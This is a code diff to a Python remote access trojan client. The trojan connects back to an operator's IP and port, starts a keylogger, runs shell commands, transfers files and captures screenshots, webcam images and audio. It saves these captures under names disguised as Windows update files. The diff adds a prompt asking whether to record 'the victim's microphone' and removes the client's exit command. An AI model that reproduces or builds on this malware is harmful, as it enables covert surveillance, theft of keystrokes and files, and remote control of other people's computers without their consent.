@@ -3,7 +3,7 @@ import os
 import simplejson
 import base64
 import socket
-from util import kg
+import kg
 import time
 import threading
 import pyttsx3
@@ -11,7 +11,10 @@ from PIL import ImageGrab
 import sys
 import shutil
 import cv2
-from util import sound_record
+import sound_record
+
+ip = "192.168.1.105" #Change this value according to yourself.
+port = 4444 #Change this value according to yourself.
 
 my_thread = threading.Thread(target=kg.kg_Start)
 my_thread.start()
@@ -24,10 +27,16 @@ class mySocket():
         self.ss_file = os.environ["appdata"]+"\\update.png"
         self.camera_file = os.environ["appdata"]+"\\windowsupdate.png"
         self.sound_file = os.environ["appdata"]+"\\windowssounds.wav"
-        my_thread2 = threading.Thread(target=self.Start_Record)
-        my_thread2.start()
+        self.Mic_Question()
 
-
+    def Mic_Question(self):
+        question_answer = self.Get_Json()
+        if question_answer == "Y" or question_answer == "y":
+            my_thread2 = threading.Thread(target=self.Start_Record)
+            my_thread2.start()
+            self.Send_Json("[+]The victim's microphone recoring now.")
+        elif question_answer == "N" or question_answer == "n":
+            self.Send_Json("[+]The victim's microphone will not be recorded.")
 
     def Execute_Command(self,command):
         command_output = subprocess.check_output(command,shell=True)
@@ -129,10 +138,7 @@ class mySocket():
         while True:
             command = self.Get_Json()
             try:
-                if command[0] == "exit":
-                    self.connection.close()
-                    exit()
-                elif command[0] == "cd" and len(command) > 1:
+                if command[0] == "cd" and len(command) > 1:
                     command_output = self.Execute_cd(command[1])
                 elif command[0] == "download":
                     command_output = self.Get_File_Contents(command[1])
@@ -211,7 +217,7 @@ def Try_Connection():
     while True:
         time.sleep(5)
         try:
-            mysocket = mySocket("192.168.1.105",4444) # Change this values according to yourself.
+            mysocket = mySocket(ip,port)
             mysocket.Client_Start()
         except Exception:
             Try_Connection()
